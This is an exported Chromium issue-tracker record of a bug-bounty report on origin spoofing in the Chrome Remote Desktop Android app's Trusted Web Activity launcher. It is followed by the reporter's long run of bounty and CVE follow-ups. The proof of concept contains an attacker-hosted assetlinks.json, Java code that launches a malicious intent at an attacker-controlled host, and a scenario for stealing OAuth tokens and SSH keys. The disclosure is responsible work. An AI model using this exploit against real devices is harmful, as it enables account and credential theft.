# TWA Origin Spoofing & UI Redressing via Intent Injection

| Field | Value |
|-------|-------|
| **Issue ID** | [477876507](https://issues.chromium.org/issues/477876507) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P3 |
| **Component** | Services (Use Subcomponents)>Chromoting |
| **Platforms** | Android |
| **Reporter** | ha...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2026-01-22 |
| **Bounty** | $2,000.00 |

## Description

**Summary:** TWA Origin Spoofing & UI Redressing via Intent Injection

**Program:** Mobile VRP

**URL:** com.google.chromeremotedesktop

**Vulnerability type:** Security UI Spoofing

### Details

#### Summary

The Chrome Remote Desktop Android application suffers from an Improper Input Validation vulnerability in its Trusted Web Activity (TWA) launcher.

The application fails to validate the Data URI of incoming Intents against its internal allowlist (asset\_statements) before launching a Custom Tab session. This allows an attacker to inject an arbitrary URL (e.g., <https://attacker.com>) into the application's TWA flow. By hosting a valid assetlinks.json file on the malicious domain, the attacker can force the application to hide the URL bar and security indicators in `MainActivity`

```
        Uri data = getIntent().getData();
        if (bundle == null && data == null && !isTaskRoot()) {
            finish();
            return;
        }
        if ((getIntent().getFlags() & 268435456) == 0 || (getIntent().getFlags() & 524288) != 0) {
            Intent intent = new Intent(getIntent());
            intent.setFlags((268435456 | getIntent().getFlags()) & (-524289));
            startActivity(intent);
            finish();
        }

```

First request come from the app to `/.well-known/assetlinks.json` so all we need to host this file on our server like `https://remotedesktop.google.com/.well-known/assetlinks.json` so our domain will be vaild for `Trusted Web Activities`

#### Proof of Concept (PoC)

1. Attacker Infrastructure
   The attacker hosts the following Digital Asset Link file at <https://attacker.com/.well-known/assetlinks.json> to satisfy the OS-level verification:

```
[{
  "relation": ["delegate_permission/common.handle_all_urls"],
  "target": {
    "namespace": "android_app",
    "package_name": "com.google.chromeremotedesktop",
    "sha256_cert_fingerprints": ["F0:FD:6C:5B:41..."]
  }
}]

```

2.Exploitation Trigger

```
                Intent malicious = new Intent(Intent.ACTION_VIEW);
        malicious.setData(Uri.parse("https://remote.free.beeceptor.com"));
        malicious.setComponent(new ComponentName(
                "com.google.chromeremotedesktop",
                "com.google.remoting.androidwrapper.MainActivity"
        ));
        malicious.setFlags(0); // No NEW_TASK flag → triggers the redirection
        startActivity(malicious);

```

4. Logs of Acitivty Thread

```
 [Intent]
  • Action: android.intent.action.VIEW
  • Data: https://testraf.free.beeceptor.com
  • Scheme: https
  • Extras: (10 items)
     - androidx.browser.trusted.extra.SCREEN_ORIENTATION: 0
     - android.support.customtabs.extra.SESSION: b@d9ad0ab
     - androidx.browser.trusted.EXTRA_SPLASH_SCREEN_PARAMS: Bundle[{androidx.browser.trusted.trusted.KEY_SPLASH_SCREEN_BACKGROUND_COLOR=-13619152, androidx.browser.trusted.KEY_SPLASH_SCREEN_VERSION=androidx.browser.trusted.category.TrustedWebActivitySplashScreensV1}]
     - androidx.browser.customtabs.extra.FOCUS_INTENT: PendingIntent{5c12308: android.os.BinderProxy@749dc2c}
       ↳ Creator: com.google.chromeremotedesktop (UID: 10446)
     - androidx.browser.trusted.extra.DISPLAY_MODE: Bundle[{androidx.browser.trusted.displaymode.KEY_ID=0}]
     - android.support.customtabs.extra.SESSION_ID: PendingIntent{c188aa1: android.os.BinderProxy@b71dc8a}
       ↳ Creator: com.google.chromeremotedesktop (UID: 10446)
     - android.support.customtabs.extra.EXTRA_ENABLE_INSTANT_APPS: true
     - androidx.browser.customtabs.extra.SHARE_STATE: 0
     - com.android.browser.headers: Bundle[{Accept-Language=en-GB}]
     - android.support.customtabs.extra.LAUNCH_AS_TRUSTED_WEB_ACTIVITY: true

```

5. Remediation
   The application must validate the incoming Intent URL against a strict allowlist before initializing.

```
Uri data = getIntent().getData();
String ALLOWED_HOST = "remotedesktop.google.com";

if (data != null && !ALLOWED_HOST.equalsIgnoreCase(data.getHost())) {
    Intent browserIntent = new Intent(Intent.ACTION_VIEW, data);
    startActivity(browserIntent);
    finish();

```

for X-Frame bypass i used this one
<https://github.com/niutech/x-frame-bypass>

---

Environment
Device: Samsung A16

Android Version: Android 15

Security Patch Level: June 1, 2026

App Version: versionName=TWA 1.5

### Attack scenario

1. Compromise of the Native-to-Web Bridge (PostMessageService)
   The application uses a specific Android service (PostMessageService) to create a secure communication channel between the native Android app and the web content. This channel is designed to be exclusive to google.com.

The Breach: By spoofing the origin, an attacker successfully binds to this service.

The Consequence: The attacker establishes a valid, two-way communication pipe (MessagePort) with the native application internals.

2. Leakage of Authentication Tokens
   The primary purpose of this bridge is to synchronize state between the app and the web session.

Mechanism: When the bridge connects, the native app logic (specifically in MigrationActivity) is designed to "hand off" the user's active session to the web client.

Data Exposed: This hand-off package typically includes OAuth Access Tokens or Refresh Tokens. Since the attacker controls the web client on the other end of the bridge, these tokens are delivered directly to the attacker's JavaScript, granting unauthorized access to the user's account.

3. Risk to Host Credentials and SSH Keys
   Chrome Remote Desktop often manages connections to remote Linux or headless machines which may utilize SSH keys or persistent host PINs/Secrets.

Scenario: If the application attempts to migrate or sync these stored credentials using the established bridge, the attacker can intercept them.

Impact: Leaking these secrets (SSH keys or Host PINs) would allow the attacker to remotely access and control the victim's computers without ever needing the user's main Google password.

## Attachments

- [{A667DE12-B559-460B-A3B4-10009509BE12}.png](attachments/{A667DE12-B559-460B-A3B4-10009509BE12}.png) (image/png, 14.0 KB)
- [{1CD1EB6D-A3B3-491F-B77F-7C4820C9A0F3}.png](attachments/{1CD1EB6D-A3B3-491F-B77F-7C4820C9A0F3}.png) (image/png, 76.4 KB)
- [{F65D6359-B7E4-48CF-8A86-2AB464D98D70}.png](attachments/{F65D6359-B7E4-48CF-8A86-2AB464D98D70}.png) (image/png, 80.5 KB)
- [{0662ACA5-8CCA-4BDC-A2EF-7E6E9B337C0A}.png](attachments/{0662ACA5-8CCA-4BDC-A2EF-7E6E9B337C0A}.png) (image/png, 62.2 KB)
- [app-debug.apk](attachments/app-debug.apk) (application/vnd.android.package-archive, 13.2 MB)

## Timeline

### sp...@google.com (2026-01-22)

*NOTE: This is an automatically generated email*

Hi! Many thanks for sharing your report.

This email confirms we've received your message. We'll investigate the issue you've reported and get back to you once we have an update. In the meantime, you might want to take a look at the [list of frequently asked questions about Google Bug Hunters](https://bughunters.google.com/about/4925519884451840/frequently-asked-questions).

Also, if you have not already done so, create a profile on [the Google Bughunters site](https://bughunters.google.com/) if you'd like us to publicly recognize your contribution:

- [Leaderboard](https://bughunters.google.com/leaderboard) – You'll be added here if we issue a reward for your report.
- [Honorable Mentions](https://bughunters.google.com/leaderboard/honorable-mentions) – You'll be added here if you are not in the Hall of Fame, but we file a security vulnerability bug based on your report.

**Note that we only act on reports concerning vulnerabilities or technical security problems in one of our products. This is not the correct channel if you need to resolve a problem with your account, or want to report non-security bugs or suggest a new product feature.**

Good news! According to Google magic, your report is likely actionable for us, so it has been moved up in our queue by raising the priority. The next step is human expert review, which should happen slightly sooner now.

Hey! Our automation saw that your report contained a link to github.com! Did you know that you can get rewarded for patching vulnerabilities? See our [Patch Rewards Program](https://bughunters.google.com/about/rules/4928084514701312/patch-rewards-program-rules) for more information!

Cheers,   

Google Security Bot

[Follow us](https://twitter.com/googlevrp) on Twitter!

### sp...@google.com (2026-01-22)

*NOTE: This is an automatically generated email*

Hey,

We just want to let you know that your report was **triaged** and we're currently looking into it.

You should receive further information in a couple of days, but it might take up to a week if we're particularly busy. In the meantime, you might want to take a look at [the list of frequently asked questions about Google Bug Hunters](https://bughunters.google.com/about/4925519884451840/frequently-asked-questions).

Thanks,   

Google Security Bot

### va...@google.com (2026-01-23)

Hi,

🎉 **Nice catch!** I've filed a bug with the responsible product team based on your report. We'll work with the product team to ensure this issue is addressed. We'll let you know when the issue was fixed.

Regarding our Vulnerability Reward Program: The VRP panel will evaluate your report at the next meeting. This evaluation includes checking for duplicates: we verify along with the product team whether the information in this report is already known internally. We'll update you once we've come to a decision.

In the meantime, **[review the payment option](https://bughunters.google.com/profile/edit) selected in your bughunters.google.com profile**. We recommend to [choose Bugcrowd](https://bughunters.google.com/blog/6483936851394560/announcing-bugcrowd-as-a-new-bughunters-google-com-payment-option) as the payment provider for your potential reward. Note that payment provider cannot be changed once the panel issued the decision.

If you don't hear back from us in 2-3 weeks, or if you have additional information about the vulnerability, let us know!

Regards,
The Google Bug Hunters Team

### ha...@gmail.com (2026-02-02)

Hello,
I have a question. This is my first accepted bug at Google, and I wanted to ask about the bounty. Will it be paid after the issue is fixed, or sooner? I’m just curious about the process.
Thank you

### ks...@google.com (2026-02-02)

Hi! Glad to hear you're excited about your first accepted bug with us! Regarding your question about the bounty, it can be paid either before or after the fix is deployed. It really depends on the VRP panel's queue and when they get to review your report.

Thank you for your time!  

The Google Bug Hunter Team

### ha...@gmail.com (2026-02-02)

Thanks, I’ll be more patient

### ko...@google.com (2026-02-05)

This report may qualify for the [Chrome Vulnerability Reward Program](https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules). We are moving this report to the Chromium issue tracker.

### ha...@gmail.com (2026-02-05)

sorry but what it means ? no bounty ? :(

### xi...@chromium.org (2026-02-05)

Thanks for the report. Assigning to CRD owner to take a look.

### ja...@chromium.org (2026-02-05)

We are working on a fix for this.

### ha...@gmail.com (2026-02-06)

Thanks for you're efforts guys 
But I want ask about severity is this final one ? S3 
While I saw few reports was S2 and S1 

### ha...@gmail.com (2026-02-12)

hello
i want to ask is there any updates like we are 3 weeks now from report this issue

### ha...@gmail.com (2026-02-19)

hello is there any update about this report ?

### ha...@gmail.com (2026-03-16)

hello is there any update about this report ? soon will be 3 months from submit

### ja...@google.com (2026-03-16)

Sorry for the delay. We had a few reports of this and I forgot to update this one. A fix was released a couple of weeks ago.

### ha...@gmail.com (2026-03-16)

glad to hear it resolved 
so do i get my rewards soon?

### ha...@gmail.com (2026-03-16)

also i want to ask is will be there cve Number ?

### ja...@google.com (2026-03-16)

I don't have any involvement in that side of things; sorry. Perhaps someone else on this bug can comment.

### ch...@google.com (2026-03-17)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ha...@gmail.com (2026-03-17)

what about my bounty should i wait more ?

### aj...@google.com (2026-03-17)

cl/860286035

### ha...@gmail.com (2026-03-20)

hope bounty send today before weekend

### ha...@gmail.com (2026-03-23)

Any updates about bounty

### ha...@gmail.com (2026-03-28)

also i want to ask about CVE ? is there one for this bug ?   

### ha...@gmail.com (2026-03-31)

Any updates ?

### ha...@gmail.com (2026-04-07)

hello dears
now this issue fixed from 20 Mar and now 18 days waiting for bounty ? what is wrong

### ha...@gmail.com (2026-04-14)

This report was verified as Fixed on March 20, 2026. It has been 25 days since resolution without an update on the reward or CVE assignment.

### ha...@gmail.com (2026-04-22)

hello any updates about reward ?

### ha...@gmail.com (2026-04-29)

It has been 40 days since this report was marked Fixed (Verified) on March 20. I have requested updates four times without a single response from the team

### ha...@gmail.com (2026-04-30)

hello ?

### ha...@gmail.com (2026-05-10)

hello guys 
anyone here tell me what is wrong 2 months from fixed status  

### ha...@gmail.com (2026-05-16)

any updates ? guys about cve or bounty 

### ha...@gmail.com (2026-05-30)

21:37 | Mar 20, 2026 fixed and verfied
anyone tell me what we are waiting for the reward and CVE

### sp...@google.com (2026-06-08)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
Baseline. User Information Disclosure.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ha...@gmail.com (2026-06-09)

thank you so much 
do i have CVE ? for this 


### ha...@gmail.com (2026-06-10)

if yes can it be by name "Mohamed Sadek" under compny "Zerodroid"

### ch...@google.com (2026-06-24)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### ha...@gmail.com (2026-06-24)

Is there anything about CVE ?

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/477876507)*
